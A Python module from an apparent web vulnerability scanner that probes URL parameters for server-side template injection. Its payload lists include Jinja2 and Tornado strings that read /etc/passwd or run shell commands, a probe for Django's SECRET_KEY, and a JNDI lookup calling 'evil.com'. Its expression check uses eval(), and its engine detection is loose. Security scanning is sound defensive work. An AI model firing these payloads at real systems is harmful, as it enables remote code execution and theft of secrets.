"""
Server-Side Template Injection (SSTI) Scanner
"""
import re
from typing import List, Optional
from .base import BaseScanner, Vulnerability, Severity


class SSTIScanner(BaseScanner):
    """Server-Side Template Injection scanner"""
    
    # Jinja2 payloads
    JINJA2_PAYLOADS = [
        "{{7*7}}",
        "{{7*'7'}}",
        "${7*7}",
        "{{config}}",
        "{{self}}",
        "{{''.__class__.__mro__[2].__subclasses__()}}",
        "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
        "{{lipsum.__globals__.__builtins__['__import__']('os').popen('id').read()}}",
    ]
    
    # Tornado payloads
    TORNADO_PAYLOADS = [
        "{{7*7}}",
        "{{handler.settings}}",
        "{%import os%}{{os.popen('id').read()}}",
    ]
    
    # Django template payloads
    DJANGO_PAYLOADS = [
        "{{7*7}}",
        "{{7|add:7}}",
        "{{request}}",
        "{{settings.SECRET_KEY}}",
        "{% load static %}{% get_static_prefix as STATIC_URL %}{{ STATIC_URL }}",
    ]
    
    # Generic SSTI payloads
    GENERIC_PAYLOADS = [
        "${7*7}",
        "#{7*7}",
        "${7*7}",
        "@(7*7)",
        "{{7*7}}",
        "${jndi:ldap://evil.com/a}",
        "#{7*7}",
    ]
    
    # Template engine detection patterns
    TEMPLATE_PATTERNS = {
        "Jinja2": [
            r"jinja2",
            r"jinja",
            r"werkzeug",
        ],
        "Tornado": [
            r"tornado",
        ],
        "Django": [
            r"django",
            r"django\.core",
        ],
        "Freemarker": [
            r"freemarker",
        ],
        "Velocity": [
            r"velocity",
        ],
        "Smarty": [
            r"smarty",
        ],
    }
    
    async def scan(self, url: str, params: Optional[dict] = None, method: str = "GET", **kwargs) -> List[Vulnerability]:
        """Scan for SSTI vulnerabilities"""
        vulnerabilities = []
        
        test_params = params or {}
        if not test_params:
            if "?" in url:
                query_string = url.split("?")[1]
                for param in query_string.split("&"):
                    if "=" in param:
                        key, value = param.split("=", 1)
                        test_params[key] = value
        
        all_payloads = (
            self.JINJA2_PAYLOADS +
            self.TORNADO_PAYLOADS +
            self.DJANGO_PAYLOADS +
            self.GENERIC_PAYLOADS
        )
        
        for param_name, param_value in test_params.items():
            for payload in all_payloads[:10]:  # Limit for performance
                try:
                    test_params_dict = {param_name: payload}
                    
                    if method.upper() == "GET":
                        resp = await self.http_client.get(url, params=test_params_dict)
                    else:
                        resp = await self.http_client.post(url, data=test_params_dict)
                    
                    # Check if template was executed
                    template_engine = self._detect_template_engine(resp.text, payload)
                    if template_engine:
                        return self._create_vulnerability(
                            name="Server-Side Template Injection",
                            severity=Severity.CRITICAL,
                            url=url,
                            parameter=param_name,
                            payload=payload,
                            description=f"SSTI vulnerability detected. Template engine: {template_engine}",
                            evidence=f"Template execution detected in response",
                            recommendation="Avoid user input in template rendering. Use context-specific escaping. Whitelist allowed template variables.",
                            cwe="CWE-94"
                        )
                    
                    # Check for mathematical expression evaluation
                    if self._check_expression_evaluation(resp.text, payload):
                        return self._create_vulnerability(
                            name="Server-Side Template Injection (Potential)",
                            severity=Severity.HIGH,
                            url=url,
                            parameter=param_name,
                            payload=payload,
                            description="Possible SSTI vulnerability (expression evaluation detected)",
                            evidence="Mathematical expression appears to be evaluated",
                            recommendation="Avoid user input in template rendering. Use context-specific escaping.",
                            cwe="CWE-94"
                        )
                except:
                    continue
        
        return vulnerabilities
    
    def _detect_template_engine(self, text: str, payload: str) -> Optional[str]:
        """Detect which template engine is being used"""
        text_lower = text.lower()
        
        for engine, patterns in self.TEMPLATE_PATTERNS.items():
            for pattern in patterns:
                if re.search(pattern, text_lower, re.IGNORECASE):
                    return engine
        
        return None
    
    def _check_expression_evaluation(self, text: str, payload: str) -> bool:
        """Check if mathematical expression was evaluated"""
        # Check for {{7*7}} -> 49
        if "{{7*7}}" in payload or "${7*7}" in payload or "#{7*7}" in payload:
            if "49" in text:
                return True
        
        # Check for {{7*'7'}} -> 7777777
        if "{{7*'7'}}" in payload:
            if "7777777" in text or "7" * 7 in text:
                return True
        
        # Check for other expressions
        if "{{" in payload and "}}" in payload:
            # Extract expression
            match = re.search(r'\{\{([^}]+)\}\}', payload)
            if match:
                expr = match.group(1)
                # Simple check: if it's a math expression and result appears
                if "*" in expr or "+" in expr or "-" in expr:
                    try:
                        # Try to evaluate (safely)
                        result = str(eval(expr.replace("'", "").replace('"', '')))
                        if result in text:
                            return True
                    except:
                        pass
        
        return False

